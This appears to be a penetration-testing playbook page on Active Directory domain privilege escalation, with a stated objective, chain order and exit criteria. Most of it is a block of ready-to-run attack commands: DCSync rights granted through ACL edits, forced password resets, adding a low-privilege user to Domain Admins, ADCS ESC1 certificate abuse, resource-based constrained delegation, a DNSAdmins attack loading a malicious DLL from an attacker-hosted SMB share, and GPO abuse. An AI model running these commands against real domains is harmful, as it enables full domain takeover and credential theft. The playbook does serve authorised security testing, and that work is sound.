---
id: privesc
type: phase
label: "Domain Privilege Escalation"
---


# Domain Privilege Escalation

### Objective
Raise privilege on the current principal or the domain.

### Chain order
**ACL edges** → **ADCS ESC1–ESC16** → **delegation (RBCD/constrained)** → **DNSAdmins** → **GPO abuse** → **CVE (noPac/Zerologon/PrintNightmare)** only if in scope.

### Exhaustive commands
```bash
# ── ACL: WriteDacl → DCSync ───────────────────────────────────────────
python3 dacledit.py -action write -rights DCSync \
  -principal lowpriv -target-dn 'DC=corp,DC=local' \
  corp.local/admin:'Password123!' -dc-ip 10.10.10.5

# ── ACL: GenericAll → ForceChangePassword ────────────────────────────
bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
  set password victim 'NewP@ss1'

# ── ACL: AddMember → Domain Admins ───────────────────────────────────
bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
  add groupMember 'Domain Admins' lowpriv

# ── ADCS ESC1 ─────────────────────────────────────────────────────────
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -template Vuln -upn administrator@corp.local \
  -sid S-1-5-21-X-500
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

# ── RBCD ──────────────────────────────────────────────────────────────
impacket-addcomputer -computer-name 'PWN$' -computer-pass 'Pwn123!' \
  -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
python3 rbcd.py -delegate-from 'PWN$' -delegate-to 'TARGET$' \
  -action write -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator \
  'corp.local/PWN$:Pwn123!'

# ── DNSAdmins ─────────────────────────────────────────────────────────
impacket-smbserver share ./dll -smb2support
dnscmd DC01 /config /serverlevelplugindll \\10.10.10.99\share\evil.dll
sc \\DC01 stop dns ; sc \\DC01 start dns

# ── GPO abuse ─────────────────────────────────────────────────────────
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv \
  --GPOName "Vulnerable GPO"
```

### Exit criteria
Domain Admin equivalence or DCSync capability, documented with the exact edge used.

---
